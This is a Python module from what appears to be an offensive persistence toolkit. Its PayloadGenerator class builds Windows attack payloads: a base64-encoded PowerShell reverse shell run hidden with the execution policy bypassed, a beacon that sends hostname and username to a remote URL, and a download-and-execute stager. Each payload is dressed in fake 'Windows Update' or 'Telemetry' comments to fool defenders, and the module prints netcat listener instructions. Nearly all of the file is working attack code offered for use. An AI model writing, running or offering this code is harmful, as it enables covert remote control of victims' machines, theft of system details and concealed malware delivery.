"""
Payload generation for persistence methods
"""

import base64
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ..core.utils import generate_random_name
from ..config import DEFAULT_STAGING_DIR


class PayloadGenerator:
    """Handles creation of various payload types"""
    
    def __init__(self, staging_dir=DEFAULT_STAGING_DIR):
        self.staging_dir = staging_dir
    
    def create_reverse_shell(self, attacker_ip, attacker_port):
        """
        Create a PowerShell reverse shell payload
        
        Args:
            attacker_ip (str): Attacker's IP address
            attacker_port (int): Attacker's listening port
            
        Returns:
            str: Path to created payload file
        """
        print("[*] Creating PowerShell reverse shell payload...")
        print(f"[*] Target: {attacker_ip}:{attacker_port}")
        
        # PowerShell reverse shell
        ps_payload = f'''
$c = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{{0}};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}};
$c.Close()
'''
        
        # Base64 encode the payload
        ps_bytes = ps_payload.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_bytes).decode()
        
        # Create wrapper script with legitimate-looking name
        script_name = generate_random_name() + ".ps1"
        script_path = os.path.join(self.staging_dir, script_name)
        
        # Wrapper that executes encoded command
        wrapper = f'''# Windows System Update Handler
# Auto-generated by Windows Update Service
# DO NOT MODIFY OR DELETE

$EncodedCommand = "{ps_b64}"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $EncodedCommand
'''
        
        try:
            with open(script_path, 'w') as f:
                f.write(wrapper)
            
            print(f"[+] Payload created: {script_path}")
            print(f"[+] Type: PowerShell reverse shell")
            print(f"[+] Connection: {attacker_ip}:{attacker_port}")
            print(f"\n[*] Start listener on attacker machine:")
            print(f"    nc -lvnp {attacker_port}")
            
            return script_path
            
        except Exception as e:
            print(f"[-] Error creating payload: {e}")
            return None
    
    def create_batch_payload(self, command):
        """
        Create a simple batch file payload
        
        Args:
            command (str): Command to execute
            
        Returns:
            str: Path to created payload file
        """
        print("[*] Creating batch payload...")
        
        script_name = generate_random_name() + ".bat"
        script_path = os.path.join(self.staging_dir, script_name)
        
        # Create batch file
        batch_content = f'''@echo off
REM Windows System Maintenance Script
REM Auto-generated

{command}
'''
        
        try:
            with open(script_path, 'w') as f:
                f.write(batch_content)
            
            print(f"[+] Batch payload created: {script_path}")
            print(f"[+] Command: {command}")
            
            return script_path
            
        except Exception as e:
            print(f"[-] Error creating batch payload: {e}")
            return None
    
    def create_beacon_payload(self, beacon_url, interval=60):
        """
        Create a beacon payload that phones home periodically
        
        Args:
            beacon_url (str): URL to beacon to
            interval (int): Beacon interval in seconds
            
        Returns:
            str: Path to created payload file
        """
        print("[*] Creating beacon payload...")
        print(f"[*] Beacon URL: {beacon_url}")
        print(f"[*] Interval: {interval} seconds")
        
        script_name = generate_random_name() + ".ps1"
        script_path = os.path.join(self.staging_dir, script_name)
        
        # PowerShell beacon script
        ps_script = f'''# Windows Telemetry Service
# Auto-generated system monitoring script

$BeaconUrl = "{beacon_url}"
$Interval = {interval}

while ($true) {{
    try {{
        $info = @{{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }}
        
        $body = $info | ConvertTo-Json
        Invoke-RestMethod -Uri $BeaconUrl -Method POST -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
    }} catch {{
        # Silently continue on error
    }}
    
    Start-Sleep -Seconds $Interval
}}
'''
        
        try:
            with open(script_path, 'w') as f:
                f.write(ps_script)
            
            print(f"[+] Beacon payload created: {script_path}")
            print(f"[+] Type: HTTP beacon")
            print(f"[+] Interval: {interval} seconds")
            print(f"\n[*] Set up listener on attacker machine:")
            print(f"    python3 -m http.server 80")
            
            return script_path
            
        except Exception as e:
            print(f"[-] Error creating beacon payload: {e}")
            return None
    
    def create_download_execute(self, download_url):
        """
        Create payload that downloads and executes a file
        
        Args:
            download_url (str): URL to download from
            
        Returns:
            str: Path to created payload file
        """
        print("[*] Creating download-execute payload...")
        print(f"[*] Download URL: {download_url}")
        
        script_name = generate_random_name() + ".ps1"
        script_path = os.path.join(self.staging_dir, script_name)
        
        # PowerShell download and execute
        ps_script = f'''# Windows Update Component
# Auto-generated update script

$url = "{download_url}"
$output = "$env:TEMP\\update_" + (Get-Random) + ".exe"

try {{
    # Download
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
    
    # Execute
    Start-Process -FilePath $output -WindowStyle Hidden
    
    # Clean up (optional - comment out if you want file to persist)
    # Start-Sleep -Seconds 5
    # Remove-Item $output -Force
}} catch {{
    # Silently fail
}}
'''
        
        try:
            with open(script_path, 'w') as f:
                f.write(ps_script)
            
            print(f"[+] Download-execute payload created: {script_path}")
            print(f"[+] Type: Download and execute")
            print(f"[+] URL: {download_url}")
            print(f"\n[*] Host your payload file:")
            print(f"    python3 -m http.server 8080")
            
            return script_path
            
        except Exception as e:
            print(f"[-] Error creating download-execute payload: {e}")
            return None
    
    def create_custom_payload(self, powershell_code):
        """
        Create a custom PowerShell payload
        
        Args:
            powershell_code (str): Custom PowerShell code
            
        Returns:
            str: Path to created payload file
        """
        print("[*] Creating custom PowerShell payload...")
        
        script_name = generate_random_name() + ".ps1"
        script_path = os.path.join(self.staging_dir, script_name)
        
        # Wrap custom code in legitimate-looking comments
        ps_script = f'''# Windows System Service
# Auto-generated maintenance script

{powershell_code}
'''
        
        try:
            with open(script_path, 'w') as f:
                f.write(ps_script)
            
            print(f"[+] Custom payload created: {script_path}")
            
            return script_path
            
        except Exception as e:
            print(f"[-] Error creating custom payload: {e}")
            return None